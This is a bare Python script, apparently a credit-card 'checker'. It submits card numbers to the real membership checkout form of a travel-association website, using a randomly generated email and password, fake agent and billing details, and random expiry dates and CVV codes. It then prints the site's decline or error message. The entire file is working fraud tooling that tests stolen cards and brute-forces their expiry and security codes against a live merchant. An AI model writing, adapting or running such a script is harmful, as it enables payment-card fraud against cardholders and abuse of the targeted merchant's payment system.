import requests
import json
import random
import string
import threading

def gen():
    domains = ["gmail.com", "yahoo.com", "outlook.com"]
    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@" + random.choice(domains)
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    user = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return email, password, user

# Optimized function to extract a substring between two delimiters
def cap(data, first, last):
    start = data.find(first)
    if start == -1:
        return None
    start += len(first)
    end = data.find(last, start)
    return data[start:end] if end != -1 else None

# Session for making requests
r = requests.Session()

def killit(card):
    email, pwd, user = gen()
    cc, month, year, cvv = card.split("|")
    months = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"]
    years = ["2025", "2026", "2027", "2028", "2029", "2030", "2031", "2032", "2033", "2034"]
    month = random.choice(months)
    year = random.choice(years)
    cvv = random.randint(000, 999)
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Origin': 'https://www.ccra.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.ccra.com/membership-account/membership-checkout/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
    response = r.get('https://www.ccra.com/membership-account/membership-checkout/', headers=headers)
    nonce = cap(response.text, 'name="pmpro_checkout_nonce" value="', '"')

    data = {
    'pmpro_level': '6',
    'checkjavascript': '1',
    'pmpro_other_discount_code': '',
    'username': user,
    'password': pwd,
    'password2': pwd,
    'bemail': email,
    'bconfirmemail': email,
    'fullname': '',
    'Agent_First_Name': 'Shadow',
    'Agent_Last_Name': 'Ispro',
    'Agency_Name': 'Nuh',
    'Mailing_Address': '2065 Boyle Heights Suite 589',
    'Mailing_City': 'Vonchester',
    'Mailing_State_Province': 'FL',
    'Mailing_Zip_Code': '68947',
    'Mailing_Country': 'US',
    'Business_Phone': '2345893695',
    'Website_URL': '',
    'Years_Selling_Travel': '',
    'Gross_Annual_Sales': '',
    'Accreditation_Held': '',
    'HowDidYouHear_TGN': '',
    'Chapter': 'Orlando',
    'TRUE': '',
    'tos': '1',
    'tos_checkbox': '0',
    'OptIn': 'true',
    'seats': '25',
    'bfirstname': 'Shadow',
    'blastname': 'Pro',
    'baddress1': '2065 Boyle Heights Suite 589',
    'baddress2': '',
    'bcity': 'Vonchester',
    'bstate': 'FL',
    'bzipcode': '68947',
    'bcountry': 'US',
    'bphone': '(234) 589-3695',
    'CardType': 'Visa',
    'AccountNumber': cc,
    'ExpirationMonth': month,
    'ExpirationYear': year,
    'CVV': cvv,
    'pmpro_discount_code': '',
    'pmpro_checkout_nonce': nonce,
    '_wp_http_referer': '/membership-account/membership-checkout/',
    'submit-checkout': '1',
    'javascriptok': '1',
    'bed0775404383a8621c0518ed8e87a15': 'fddcdad133929fb421914388d078b730',
    'WP55T3S7XJS2': '7H5W8K53HX',
}

    response = r.post('https://www.ccra.com/membership-account/membership-checkout/', headers=headers, data=data)
    result = cap(response.text, 'class="pmpro_message pmpro_error">', "</div>") or  "Transaction Declined."
    print(result)#return f"<b>Result:</b> {result}"
#